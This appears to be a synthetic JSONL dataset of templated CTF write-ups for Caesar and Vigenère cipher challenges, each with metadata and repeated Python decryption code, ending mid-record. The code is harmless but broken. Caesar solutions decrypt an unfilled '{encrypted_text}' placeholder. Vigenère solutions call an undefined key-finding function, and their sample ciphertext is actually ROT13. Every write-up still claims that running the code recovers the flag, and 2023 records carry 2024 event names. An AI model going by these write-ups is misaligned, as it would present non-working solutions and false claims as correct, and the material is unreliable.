{"id": "synthetic_classical_037", "team": "synthetic_team_7", "event": "CTF_2024_Event_6", "challenge_name": "Caesar Cipher #38", "challenge_description": "Simple shift cipher, brute force all shifts", "attack_type": "Classical", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Caesar Cipher\n\n## Challenge Description\nSimple shift cipher, brute force all shifts\n\n## Analysis\nThis challenge involves caesar cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n", "url": "https://synthetic-ctf.example.com/classical/37", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.832105", "synthetic": true}
{"id": "synthetic_classical_038", "team": "synthetic_team_5", "event": "CTF_2024_Event_1", "challenge_name": "Vigenère Cipher #39", "challenge_description": "Polyalphabetic substitution cipher with repeating key", "attack_type": "Classical", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Vigenère Cipher\n\n## Challenge Description\nPolyalphabetic substitution cipher with repeating key\n\n## Analysis\nThis challenge involves vigenère cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n", "url": "https://synthetic-ctf.example.com/classical/38", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.832421", "synthetic": true}
{"id": "synthetic_classical_039", "team": "synthetic_team_9", "event": "CTF_2024_Event_3", "challenge_name": "Caesar Cipher #40", "challenge_description": "Simple shift cipher, brute force all shifts", "attack_type": "Classical", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Caesar Cipher\n\n## Challenge Description\nSimple shift cipher, brute force all shifts\n\n## Analysis\nThis challenge involves caesar cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n", "url": "https://synthetic-ctf.example.com/classical/39", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.832438", "synthetic": true}
{"id": "synthetic_classical_040", "team": "synthetic_team_3", "event": "CTF_2024_Event_1", "challenge_name": "Vigenère Cipher #41", "challenge_description": "Polyalphabetic substitution cipher with repeating key", "attack_type": "Classical", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Vigenère Cipher\n\n## Challenge Description\nPolyalphabetic substitution cipher with repeating key\n\n## Analysis\nThis challenge involves vigenère cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n", "url": "https://synthetic-ctf.example.com/classical/40", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.832455", "synthetic": true}
{"id": "synthetic_classical_041", "team": "synthetic_team_5", "event": "CTF_2024_Event_14", "challenge_name": "Caesar Cipher #42", "challenge_description": "Simple shift cipher, brute force all shifts", "attack_type": "Classical", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Caesar Cipher\n\n## Challenge Description\nSimple shift cipher, brute force all shifts\n\n## Analysis\nThis challenge involves caesar cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n", "url": "https://synthetic-ctf.example.com/classical/41", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.832468", "synthetic": true}
{"id": "synthetic_classical_042", "team": "synthetic_team_8", "event": "CTF_2024_Event_6", "challenge_name": "Caesar Cipher #43", "challenge_description": "Simple shift cipher, brute force all shifts", "attack_type": "Classical", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Caesar Cipher\n\n## Challenge Description\nSimple shift cipher, brute force all shifts\n\n## Analysis\nThis challenge involves caesar cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n", "url": "https://synthetic-ctf.example.com/classical/42", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.832478", "synthetic": true}
{"id": "synthetic_classical_043", "team": "synthetic_team_10", "event": "CTF_2024_Event_20", "challenge_name": "Caesar Cipher #44", "challenge_description": "Simple shift cipher, brute force all shifts", "attack_type": "Classical", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Caesar Cipher\n\n## Challenge Description\nSimple shift cipher, brute force all shifts\n\n## Analysis\nThis challenge involves caesar cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n", "url": "https://synthetic-ctf.example.com/classical/43", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.832488", "synthetic": true}
{"id": "synthetic_classical_044", "team": "synthetic_team_7", "event": "CTF_2024_Event_14", "challenge_name": "Caesar Cipher #45", "challenge_description": "Simple shift cipher, brute force all shifts", "attack_type": "Classical", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Caesar Cipher\n\n## Challenge Description\nSimple shift cipher, brute force all shifts\n\n## Analysis\nThis challenge involves caesar cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n", "url": "https://synthetic-ctf.example.com/classical/44", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.832499", "synthetic": true}
{"id": "synthetic_classical_045", "team": "synthetic_team_1", "event": "CTF_2024_Event_5", "challenge_name": "Caesar Cipher #46", "challenge_description": "Simple shift cipher, brute force all shifts", "attack_type": "Classical", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Caesar Cipher\n\n## Challenge Description\nSimple shift cipher, brute force all shifts\n\n## Analysis\nThis challenge involves caesar cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n", "url": "https://synthetic-ctf.example.com/classical/45", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.832511", "synthetic": true}
{"id": "synthetic_classical_046", "team": "synthetic_team_4", "event": "CTF_2024_Event_19", "challenge_name": "Caesar Cipher #47", "challenge_description": "Simple shift cipher, brute force all shifts", "attack_type": "Classical", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Caesar Cipher\n\n## Challenge Description\nSimple shift cipher, brute force all shifts\n\n## Analysis\nThis challenge involves caesar cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n", "url": "https://synthetic-ctf.example.com/classical/46", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.832523", "synthetic": true}
{"id": "synthetic_classical_047", "team": "synthetic_team_5", "event": "CTF_2024_Event_5", "challenge_name": "Vigenère Cipher #48", "challenge_description": "Polyalphabetic substitution cipher with repeating key", "attack_type": "Classical", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Vigenère Cipher\n\n## Challenge Description\nPolyalphabetic substitution cipher with repeating key\n\n## Analysis\nThis challenge involves vigenère cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n", "url": "https://synthetic-ctf.example.com/classical/47", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.832542", "synthetic": true}
{"id": "synthetic_classical_048", "team": "synthetic_team_3", "event": "CTF_2024_Event_20", "challenge_name": "Vigenère Cipher #49", "challenge_description": "Polyalphabetic substitution cipher with repeating key", "attack_type": "Classical", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Vigenère Cipher\n\n## Challenge Description\nPolyalphabetic substitution cipher with repeating key\n\n## Analysis\nThis challenge involves vigenère cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n", "url": "https://synthetic-ctf.example.com/classical/48", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.832559", "synthetic": true}
{"id": "synthetic_classical_049", "team": "synthetic_team_9", "event": "CTF_2024_Event_9", "challenge_name": "Vigenère Cipher #50", "challenge_description": "Polyalphabetic substitution cipher with repeating key", "attack_type": "Classical", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Vigenère Cipher\n\n## Challenge Description\nPolyalphabetic substitution cipher with repeating key\n\n## Analysis\nThis challenge involves vigenère cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n", "url": "https://synthetic-ctf.example.com/classical/49", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.832574", "synthetic": true}
{"id": "synthetic_classical_050", "team": "synthetic_team_7", "event": "CTF_2024_Event_17", "challenge_name": "Caesar Cipher #51", "challenge_description": "Simple shift cipher, brute force all shifts", "attack_type": "Classical", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Caesar Cipher\n\n## Challenge Description\nSimple shift cipher, brute force all shifts\n\n## Analysis\nThis challenge involves caesar cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n", "url": "https://synthetic-ctf.example.com/classical/50", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.832585", "synthetic": true}
{"id": "synthetic_classical_051", "team": "synthetic_team_10", "event": "CTF_2024_Event_13", "challenge_name": "Caesar Cipher #52", "challenge_description": "Simple shift cipher, brute force all shifts", "attack_type": "Classical", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Caesar Cipher\n\n## Challenge Description\nSimple shift cipher, brute force all shifts\n\n## Analysis\nThis challenge involves caesar cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n", "url": "https://synthetic-ctf.example.com/classical/51", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.832595", "synthetic": true}
{"id": "synthetic_classical_052", "team": "synthetic_team_7", "event": "CTF_2024_Event_13", "challenge_name": "Vigenère Cipher #53", "challenge_description": "Polyalphabetic substitution cipher with repeating key", "attack_type": "Classical", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Vigenère Cipher\n\n## Challenge Description\nPolyalphabetic substitution cipher with repeating key\n\n## Analysis\nThis challenge involves vigenère cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n", "url": "https://synthetic-ctf.example.com/classical/52", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.832615", "synthetic": true}
{"id": "synthetic_classical_053", "team": "synthetic_team_5", "event": "CTF_2024_Event_9", "challenge_name": "Vigenère Cipher #54", "challenge_description": "Polyalphabetic substitution cipher with repeating key", "attack_type": "Classical", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Vigenère Cipher\n\n## Challenge Description\nPolyalphabetic substitution cipher with repeating key\n\n## Analysis\nThis challenge involves vigenère cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, 